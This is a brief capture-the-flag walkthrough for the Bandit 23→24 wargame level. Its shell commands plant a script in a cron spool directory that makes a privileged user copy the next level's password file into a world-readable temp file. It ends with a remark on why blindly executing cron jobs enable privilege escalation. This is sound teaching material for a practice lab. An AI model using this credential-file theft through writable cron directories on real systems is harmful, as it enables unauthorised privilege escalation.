# Bandit 23 → 24

```console
$ mkdir -p /tmp/abcdef && cd /tmp/abcdef && chmod 777 /tmp/abcdef
$ cat << 'INNER' > script.sh
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/abcdef/pass.txt
chmod 666 /tmp/abcdef/pass.txt
INNER
$ chmod 777 script.sh
$ cp script.sh /var/spool/bandit24/foo/
#wait 60 seconds
$ cat /tmp/abcdef/pass.txt
<REDACTED>
```

a cron job that blindly executes attacker-supplied scripts is a privilege-escalation gift, make sure your working dir and files are writable/readable by the cron user